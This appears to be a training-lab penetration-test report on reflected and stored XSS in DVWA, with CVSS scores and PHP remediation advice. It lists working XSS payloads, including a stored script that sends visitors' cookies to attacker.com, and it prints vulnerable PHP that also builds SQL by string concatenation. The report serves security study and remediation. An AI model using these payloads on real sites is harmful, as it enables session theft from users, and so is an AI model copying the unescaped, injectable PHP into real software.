CROSS-SITE SCRIPTING (XSS) VULNERABILITIES - FINDINGS


DATE: 2026-01-16
TESTER: Lakshan
APPLICATION: DVWA v1.10
SECURITY LEVEL: Low

==========================================
1. REFLECTED XSS VULNERABILITY
==========================================

VULNERABILITY: Reflected Cross-Site Scripting (XSS)
LOCATION: http://localhost/vulnerabilities/xss_r/
PARAMETER: name (GET)
SEVERITY: MEDIUM (CVSS 6.1)
STATUS: Confirmed Exploitable

DESCRIPTION:
-----------
User input from the 'name' parameter is reflected in the HTTP response
without proper encoding or sanitization, allowing execution of arbitrary
JavaScript code in the victim's browser.

SUCCESSFUL PAYLOADS:
-------------------

1. Basic Alert:
   <script>alert('XSS')</script>
   Result: JavaScript executed successfully

2. Cookie Theft:
   <script>alert(document.cookie)</script>
   Result: Session cookie displayed in alert

3. Image Tag:
   <img src=x onerror=alert('XSS')>
   Result: Alternative injection method successful

4. SVG Tag:
   <svg onload=alert('XSS')>
   Result: Event-based XSS successful

EXPLOITATION STEPS:
------------------
1. Navigate to http://localhost/vulnerabilities/xss_r/
2. Enter payload in "What's your name?" field
3. Click Submit
4. JavaScript executes in browser context

ATTACK FLOW:
-----------
Attacker → Crafts malicious URL → Sends to victim
Victim clicks link → Payload executes → Cookies/data stolen

IMPACT:
-------
- Session hijacking through cookie theft
- Phishing via page content manipulation  
- Keylogger injection for credential theft
- Redirection to malicious websites
- Drive-by malware downloads

CVSS v3.1 Score: 6.1 (MEDIUM)
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N

Breakdown:
- Attack Vector: Network
- Attack Complexity: Low
- Privileges Required: None
- User Interaction: Required (victim must click link)
- Scope: Changed (affects other users)
- Confidentiality: Low
- Integrity: Low
- Availability: None

EVIDENCE:
---------
Screenshots:
- reflected-xss-input.png (Payload in input field)
- reflected-xss-alert.png (JavaScript execution)
- reflected-xss-source.png (Injected code in HTML)
- reflected-xss-cookie.png (Cookie theft demonstration)
- reflected-xss-poc-page.png (Proof of Concept file)

Proof of Concept: reflected-xss-poc.html


==========================================
2. STORED XSS VULNERABILITY  
==========================================

VULNERABILITY: Stored Cross-Site Scripting (XSS)
LOCATION: http://localhost/vulnerabilities/xss_s/
PARAMETERS: txtName, mtxMessage (POST)
SEVERITY: HIGH (CVSS 7.1)
STATUS: Confirmed Exploitable

DESCRIPTION:
-----------
User input submitted to the guestbook is stored in the database without
sanitization and displayed to all users without encoding, resulting in
persistent XSS affecting every visitor to the page.

SUCCESSFUL PAYLOADS:
-------------------

1. Basic Alert (Persistent):
   Name: TestUser
   Message: <script>alert('Stored XSS')</script>
   Result: Alert executes for all users on every page load

2. Cookie Stealing (Persistent):
   Name: Attacker
   Message: <script>document.write('<img src="http://attacker.com/steal?cookie=' + document.cookie + '">');</script>
   Result: Would exfiltrate cookies of all visitors

3. Image Tag (Persistent):
   Name: TestUser2
   Message: <img src=x onerror=alert('Stored XSS')>
   Result: Alternative injection method, affects all users

EXPLOITATION STEPS:
------------------
1. Navigate to http://localhost/vulnerabilities/xss_s/
2. Enter malicious payload in guestbook form
3. Click "Sign Guestbook"
4. Payload stored in database
5. JavaScript executes for ALL users viewing the page
6. Payload persists until manually removed from database

PERSISTENCE:
-----------
✓ Payload survives page refresh
✓ Affects all users (not just the attacker)
✓ Remains until database reset
✓ Executes automatically on page load

ATTACK FLOW:
-----------
Attacker → Posts malicious comment → Stored in database
Any user visits page → Payload auto-executes → Data stolen

IMPACT:
-------
- Mass session hijacking (affects ALL users)
- Widespread phishing attacks
- Automated credential theft
- Worm-like propagation potential
- Long-term compromise of application
- Reputational damage

CVSS v3.1 Score: 7.1 (HIGH)
Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N

Breakdown:
- Attack Vector: Network
- Attack Complexity: Low
- Privileges Required: Low (must have account)
- User Interaction: None (automatic execution)
- Scope: Unchanged
- Confidentiality: High
- Integrity: Low
- Availability: None

EVIDENCE:
---------
Screenshots:
- stored-xss-form.png (Guestbook form with payload)
- stored-xss-alert.png (Initial JavaScript execution)
- stored-xss-persistence.png (Alert after page refresh)
- stored-xss-source.png (Stored code in HTML)


==========================================
VULNERABLE CODE ANALYSIS
==========================================

REFLECTED XSS - Likely Code:
```php
<?php
$name = $_GET['name'];
echo "Hello " . $name;  // No encoding!
?>
```

STORED XSS - Likely Code:
```php
<?php
$name = $_POST['txtName'];
$message = $_POST['mtxMessage'];

// Store in database without sanitization
$query = "INSERT INTO guestbook (name, comment) VALUES ('$name', '$message')";
mysqli_query($conn, $query);

// Display without encoding
$result = mysqli_query($conn, "SELECT * FROM guestbook");
while ($row = mysqli_fetch_assoc($result)) {
    echo $row['comment'];  // No encoding!
}
?>
```


==========================================
REMEDIATION RECOMMENDATIONS
==========================================

IMMEDIATE FIXES (Critical):
--------------------------

1. Output Encoding (MOST IMPORTANT):

For Reflected XSS:
```php
<?php
$name = $_GET['name'];
echo "Hello " . htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
?>
```

For Stored XSS:
```php
<?php
while ($row = mysqli_fetch_assoc($result)) {
    echo htmlspecialchars($row['comment'], ENT_QUOTES, 'UTF-8');
}
?>
```

2. Input Validation:
```php
<?php
$name = $_GET['name'];
// Strip HTML tags
$name = strip_tags($name);
// Or validate against whitelist
if (preg_match('/^[a-zA-Z0-9\s]+$/', $name)) {
    // Valid input
} else {
    die("Invalid input");
}
?>
```

SHORT-TERM (Within 7 Days):
--------------------------

1. Content Security Policy (CSP):
```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
```

2. HTTPOnly Cookie Flag:
```php
setcookie("PHPSESSID", $sessionid, [
    'httponly' => true,
    'secure' => true,
    'samesite' => 'Strict'
]);
```

3. X-XSS-Protection Header:
```
X-XSS-Protection: 1; mode=block
```

4. X-Content-Type-Options:
```
X-Content-Type-Options: nosniff
```

LONG-TERM (Within 30 Days):
--------------------------

1. Use templating engines with auto-escaping (Twig, Blade)
2. Implement Web Application Firewall (WAF)
3. Regular security code reviews
4. Automated XSS scanning in CI/CD pipeline
5. Security training for developers
6. Input validation library implementation
7. Regular penetration testing


==========================================
COMPARISON: REFLECTED VS STORED XSS
==========================================

REFLECTED XSS:
- Affects only the victim who clicks malicious link
- Non-persistent (gone after page reload)
- Requires social engineering
- CVSS: 6.1 (Medium)
- Impact: Individual users

STORED XSS:
- Affects ALL users of the application
- Persistent (stored in database)
- No social engineering needed
- CVSS: 7.1 (High)
- Impact: Mass compromise

STORED XSS IS MORE DANGEROUS!


==========================================
TESTING TOOLS USED
==========================================

- Firefox Browser (Manual testing)
- Browser Developer Tools (F12)
- Custom HTML Proof of Concept
- Manual payload crafting


==========================================
COMPLIANCE IMPACT
==========================================

These vulnerabilities may violate:
- OWASP Top 10 2021 (A03:2021 - Injection)
- PCI DSS Requirement 6.5.7
- ISO 27001 Control A.14.2.1
- GDPR Article 32 (Security of Processing)


==========================================
REFERENCES
==========================================

- OWASP XSS Guide: https://owasp.org/www-community/attacks/xss/
- CWE-79: Improper Neutralization of Input During Web Page Generation
- OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- Content Security Policy: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP


==========================================
SUMMARY
==========================================

✓ 2 XSS vulnerabilities confirmed
✓ Both Reflected and Stored XSS exploitable
✓ Multiple injection methods successful
✓ Complete proof of concept created
✓ All evidence documented with screenshots

Risk Level: HIGH
Priority: Fix Immediately